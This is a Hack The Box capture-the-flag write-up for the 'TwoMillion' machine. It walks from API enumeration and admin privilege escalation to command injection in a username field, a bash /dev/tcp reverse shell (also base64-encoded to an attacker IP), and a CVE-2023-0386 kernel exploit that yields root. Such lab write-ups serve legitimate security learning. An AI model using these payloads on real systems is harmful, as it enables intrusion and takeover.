@@ -1,0 +1,503 @@
+---
+title: TwoMillion
+description: "A detailed guide for TwoMillion ctf challenge from Hack the Box."
+pubDate: "Jan 28 2026"
+heroImage: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d7bc2758fb7589dfa046bee9ce4d75cb.png"
+author: "Koustubh Badshah"
+tags: [ctf, htb, hack the box, twomillion, beginner, web exploitation, api enumeration, privilege escalation, OverlayFS / FUSE, CVE-2023-0386]
+---
+
+# TwoMillion
+
+## ⚠️ Disclaimer
+
+<div style=" color: red;">
+The content published in this write-up is intended **strictly for educational and learning purposes**. 
+
+No sensitive information is disclosed that would compromise the integrity of active machines or violate Hack The Box’s rules. All analysis is based on publicly allowed practices and personal learning experiences.
+
+Readers are strongly encouraged to:
+- Follow **Hack The Box’s Code of Conduct**
+- Attempt the machines **independently**
+- Use this content only to **understand techniques**, not to shortcut challenges
+
+The author takes **no responsibility for misuse** of the information provided. Any testing or exploitation discussed should be performed **only in legal, authorized environments**.
+By engaging with this content, you agree to use it ethically and responsibly.
+
+</div>
+
+## Introduction
+
+TwoMillion is an easy Linux based challenge in hack the box. Which targets api enumeration, web exploitation, CVE-2023-0386 for privilege escalation.
+
+
+### Reconnaissance
+
+I started with performing a scan using nmap.
+```
+$ nmap -sC -sV -sS -O -A -p- -T4 -v <target-ip>
+```
+
+I got following results:
+```
+Not shown: 65457 closed tcp ports (reset), 76 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Did not follow redirect to http://2million.htb/
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19
+Uptime guess: 70.055 days (since Tue Nov 18 21:52:08 2025)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=263 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Adding to **/etc/hosts** -> ```echo "<target-ip> 2million.htb" | sudo tee -a /etc/hosts```.
+
+### Enumeration
+
+When I navigated to the website I found a **/invite** endpoint inspecting its content I found it's
+script files and one file seemed specially interesting to me _inviteapi.min.js_ on deobfuscation of this file from https://thanhle.io.vn/de4js/I found following code:
+```js
+function verifyInviteCode(code) {
+    var formData = {
+        "code": code
+    };
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        data: formData,
+        url: '/api/v1/invite/verify',
+        success: function (response) {
+            console.log(response)
+        },
+        error: function (response) {
+            console.log(response)
+        }
+    })
+}
+
+function makeInviteCode() {
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        url: '/api/v1/invite/how/to/generate',
+        success: function (response) {
+            console.log(response)
+        },
+        error: function (response) {
+            console.log(response)
+        }
+    })
+}
+```
+
+The function makeInviteCode is used to send a POST request to get a JSON response to get the invite code.
+```bash
+$ curl -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   249   0   249   0     0    76     0  --:--:--  0:00:03 --:--:--    76
+{
+  "0": 200,
+  "success": 1,
+  "data": {
+    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
+    "enctype": "ROT13"
+  },
+  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
+}
+```
+
+This data is in an encrypted format from ROT13. Decoding it from https://cryptii.com/pipes/rot13-decoder.
+```
+In order to generate the invite code, make a POST request to /api/v1/invite/generate
+```
+
+Making a POST request to /api/v1/invite/generate
+
+```bash
+$ curl -X POST http://2million.htb/api/v1/invite/generate
+{"0":200,"success":1,"data":{"code":"WFk0SUQtMDBFR1ItVTJJSDctRk44SFA=","format":"encoded"}}
+
+$ echo "WFk0SUQtMDBFR1ItVTJJSDctRk44SFA=" | tee -a code.txt
+WFk0SUQtMDBFR1ItVTJJSDctRk44SFA=
+
+$ base64 -d b64.txt
+XY4ID-00EGR-U2IH7-FN8HP
+```
+
+I finally got the invite code. On entering it on invite page it redirect to a signup page to fill up information. On the website we get a **admin.ovp** file might be of use,
+on visiting the **/api/v1/** endpoint I got following JSON response:
+```json
+{
+  "v1": {
+    "user": {
+      "GET": {
+        "/api/v1": "Route List",
+        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
+        "/api/v1/invite/generate": "Generate invite code",
+        "/api/v1/invite/verify": "Verify invite code",
+        "/api/v1/user/auth": "Check if user is authenticated",
+        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
+        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
+        "/api/v1/user/vpn/download": "Download OVPN file"
+      },
+      "POST": {
+        "/api/v1/user/register": "Register a new user",
+        "/api/v1/user/login": "Login with existing user"
+      }
+    },
+    "admin": {
+      "GET": {
+        "/api/v1/admin/auth": "Check if user is admin"
+      },
+      "POST": {
+        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
+      },
+      "PUT": {
+        "/api/v1/admin/settings/update": "Update user settings"
+      }
+    }
+  }
+}
+```
+
+Shows that admin settings can be updated using **/api/v1/admin/settings/update** endpoint.
+
+### Exploitation
+
+Updating the settings:
+
+```bash
+
+$ curl -sv -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=j7ctjlscddic6uu8abv3af29de" | jq
+* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.129.229.66
+*   Trying 10.129.229.66:80...
+* Established connection to 2million.htb (10.129.229.66 port 80) from 10.10.16.18 port 39170
+* using HTTP/1.x
+> PUT /api/v1/admin/settings/update HTTP/1.1
+> Host: 2million.htb
+> User-Agent: curl/8.17.0
+> Accept: */*
+> Cookie: PHPSESSID=j7ctjlscddic6uu8abv3af29de
+>
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Tue, 27 Jan 2026 18:57:53 GMT
+< Content-Type: application/json
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+<
+{ [64 bytes data]
+* Connection #0 to host 2million.htb:80 left intact
+{
+  "status": "danger",
+  "message": "Invalid content type."
+}
+
+$ curl -sv -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=j7ctjlscddic6uu8abv3af29de" --header "Content-Type: application/json" | jq
+* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.129.229.66
+*   Trying 10.129.229.66:80...
+* Established connection to 2million.htb (10.129.229.66 port 80) from 10.10.16.18 port 51348
+* using HTTP/1.x
+> PUT /api/v1/admin/settings/update HTTP/1.1
+> Host: 2million.htb
+> User-Agent: curl/8.17.0
+> Accept: */*
+> Cookie: PHPSESSID=j7ctjlscddic6uu8abv3af29de
+> Content-Type: application/json
+> Content-Length: 8
+>
+} [8 bytes data]
+* upload completely sent off: 8 bytes
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Tue, 27 Jan 2026 18:59:45 GMT
+< Content-Type: application/json
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+<
+{ [67 bytes data]
+* Connection #0 to host 2million.htb:80 left intact
+{
+  "status": "danger",
+  "message": "Missing parameter: email"
+}
+
+$ curl -sv -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=j7ctjlscddic6uu8abv3af29de" --header "Content-Type: application/json" --data '{"email": "admin@2million.htb"}' |jq
+* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.129.229.66
+*   Trying 10.129.229.66:80...
+* Established connection to 2million.htb (10.129.229.66 port 80) from 10.10.16.18 port 53282
+* using HTTP/1.x
+> PUT /api/v1/admin/settings/update HTTP/1.1
+> Host: 2million.htb
+> User-Agent: curl/8.17.0
+> Accept: */*
+> Cookie: PHPSESSID=j7ctjlscddic6uu8abv3af29de
+> Content-Type: application/json
+> Content-Length: 31
+>
+} [31 bytes data]
+* upload completely sent off: 31 bytes
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Tue, 27 Jan 2026 19:01:46 GMT
+< Content-Type: application/json
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+<
+{ [70 bytes data]
+* Connection #0 to host 2million.htb:80 left intact
+{
+  "status": "danger",
+  "message": "Missing parameter: is_admin"
+}
+
+$ curl -sv -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=j7ctjlscddic6uu8abv3af29de" --header "Content-Type: application/json" --data '{"email": "admin@2million.htb", "is_admin": 1 }' |jq
+* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.129.229.66
+*   Trying 10.129.229.66:80...
+* Established connection to 2million.htb (10.129.229.66 port 80) from 10.10.16.18 port 39240
+* using HTTP/1.x
+> PUT /api/v1/admin/settings/update HTTP/1.1
+> Host: 2million.htb
+> User-Agent: curl/8.17.0
+> Accept: */*
+> Cookie: PHPSESSID=j7ctjlscddic6uu8abv3af29de
+> Content-Type: application/json
+> Content-Length: 47
+>
+} [47 bytes data]
+* upload completely sent off: 47 bytes
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Tue, 27 Jan 2026 19:02:22 GMT
+< Content-Type: application/json
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+<
+{ [52 bytes data]
+* Connection #0 to host 2million.htb:80 left intact
+{
+  "id": 13,
+  "username": "admin",
+  "is_admin": 1
+}
+
+```
+
+Now visiting **/api/v1/admin/auth** returns true means that I got admin privilege. Now I tried other endpoints to see if I can exploit anything.
+```bash
+$ curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=j7ctjlscddic6uu8abv3af29de" --header "Content-type: application/json" --data '{"username": "test"}'
+```
+This endpoint generates for any username so it might be a possible attack vector.
+```bash
+─$ curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=j7ctjlscddic6uu8abv3af29de" --header "Content-type: application/json" --data '{"username": "$whoami;whoami;"}'
+Note: Unnecessary use of -X or --request, POST is already inferred.
+* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.129.229.66
+*   Trying 10.129.229.66:80...
+* Established connection to 2million.htb (10.129.229.66 port 80) from 10.10.16.18 port 41486
+* using HTTP/1.x
+> POST /api/v1/admin/vpn/generate HTTP/1.1
+> Host: 2million.htb
+> User-Agent: curl/8.17.0
+> Accept: */*
+> Cookie: PHPSESSID=j7ctjlscddic6uu8abv3af29de
+> Content-type: application/json
+> Content-Length: 31
+>
+* upload completely sent off: 31 bytes
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Tue, 27 Jan 2026 19:30:15 GMT
+< Content-Type: text/html; charset=UTF-8
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+<
+www-data
+* Connection #0 to host 2million.htb:80 left intact
+```
+This indeed leads to code execution. We can make a reverse shell from hear start a ncat listener in your machine ```nc -lnvp <port>```.
+
+```bash
+bash -i >& /dev/tcp/<your-ip/<port> 0>&1
+```
+
+I encoded the payload as it was not executing as intend and got the shell access:
+```bash
+$ curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=j7ctjlscddic6uu8abv3af29de" --header "Content-type: application/json" --data '{"username": "whoami;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xOC8xMjM0IDA+JjEK | base64 -d | bash;"}'
+```
+
+After getting access to shell I explored the machine 
+
+```
+www-data@2million:~/html$ whoami
+www-data
+
+www-data@2million:~/html$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@2million:/home/admin$ cat user.txt
+cat: user.txt: Permission denied
+
+www-data@2million:~/html$ ls -la
+total 56
+drwxr-xr-x 10 root root 4096 Jan 27 19:50 .
+drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
+-rw-r--r--  1 root root   87 Jun  2  2023 .env
+-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
+-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
+drwxr-xr-x  5 root root 4096 Jan 27 19:50 VPN
+drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
+drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
+drwxr-xr-x  5 root root 4096 Jun  6  2023 css
+drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
+drwxr-xr-x  2 root root 4096 Jun  6  2023 images
+-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
+drwxr-xr-x  3 root root 4096 Jun  6  2023 js
+drwxr-xr-x  2 root root 4096 Jun  6  2023 views
+
+www-data@2million:~/html$ cat .env
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+
+ww-data@2million:~/html$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/bin/bash
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
+admin:x:1000:1000::/home/admin:/bin/bash
+memcache:x:115:121:Memcached,,,:/nonexistent:/bin/false
+_laurel:x:998:998::/var/log/laurel:/bin/false
+```
+I got the credential I tried ssh and got the access and got the user flag ```cat user.txt```.
+
+### Privilege Escalation
+
+LinPEAS is a executable which helps in finding the vulnerability in a machine, I executed it and got its output to find the vulnerability or privilege escalation 
+path it gives colored output and detailed information.
+
+I got some thing interesting from the output that was really useful.
+```
+╔══════════╣ Mails (limit 50)
+      271      4 -rw-r--r--   1 admin    admin         540 Jun  2  2023 /var/mail/admin
+      271      4 -rw-r--r--   1 admin    admin         540 Jun  2  2023 /var/spool/mail/admin
+
+admin@2million:~$ cat /var/mail/admin
+From: ch4p <ch4p@2million.htb>
+To: admin <admin@2million.htb>
+Cc: g0blin <g0blin@2million.htb>
+Subject: Urgent: Patch System OS
+Date: Tue, 1 June 2023 10:45:22 -0700
+Message-ID: <9876543210@2million.htb>
+X-Mailer: ThunderMail Pro 5.2
+
+Hey admin,
+
+I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
+
+HTB Godfather
+```
+
+I instantly searched for **OverlayFS / FUSE** and got [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386).
+Finding it's exploit https://github.com/sxlmnwb/CVE-2023-0386 follow the instruction and I got the root access instantly.
+
+On Attack Machine:
+```bash
+$ git clone https://github.com/sxlmnwb/CVE-2023-0386.git
+$ zip zip -r a.zip CVE-2023-0386
+$ python3 -m http.server
+```
+On victim machine
+```bash
+$ curl <attacker-ip>:8000/a.zip -o a.zip
+$ unzip a.zip
+$ cd CVE-2023-0386
+$ make all
+$ zip -r a.zip CVE-2023-0386
+
+# On another terminal in target machine execute
+admin@2million:~/CVE-2023-0386$ ./exp
+uid:1000 gid:1000
+[+] mount success
+total 8
+drwxrwxr-x 1 root   root     4096 Jan 27 21:37 .
+drwxr-xr-x 6 root   root     4096 Jan 27 21:37 ..
+-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
+[+] exploit success!
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+root@2million:~/CVE-2023-0386# cd /root
+root@2million:/root# ls
+root.txt  snap  thank_you.json
+```
+
+
+I have not gone into another privilege escalation path [CVE-2023-4911](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so) you can read about it and try it yourself.
